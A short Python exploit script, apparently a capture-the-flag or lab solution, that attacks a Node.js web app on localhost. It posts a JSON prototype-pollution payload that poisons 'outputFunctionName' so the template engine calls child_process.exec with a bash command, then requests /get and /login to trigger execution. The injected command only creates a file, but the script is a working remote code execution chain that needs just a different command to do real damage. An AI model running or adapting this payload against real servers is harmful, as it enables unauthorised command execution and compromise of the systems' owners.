import requests
import json
# Register an account and replace the cookie obtained in packet analysis
# Step 1: 
payload = json.dumps({
  "content": {
    "constructor": {
      "prototype": {
        "outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"touch a.txt\"');var __tmp2"
      }
    }
  },
  "type": "test"
})
headers = {
  'Cookie': 'session=s%3Af0aKsHHD3eCs6kEgkJG_i8wBGv3Wfavr.ow1CkIM1f8%2BJcFdeS6MVZqBSd3gigXe7%2B3mZcA30wz8',
  'Content-Type': 'application/json'
} 
for i in range(6): 
    response = requests.request("POST", url = "localhost:3000/add", headers=headers, data=payload)
    print(response.text)

# Step 2: 
headers = {
  'Cookie': 'session=s%3Af0aKsHHD3eCs6kEgkJG_i8wBGv3Wfavr.ow1CkIM1f8%2BJcFdeS6MVZqBSd3gigXe7%2B3mZcA30wz8'
}
response = requests.request("GET", "localhost:3000/get", headers=headers, data={})

# Step 3: 
response = requests.request("POST", "localhost:3000/login", headers={}, data={})
print(response.text)
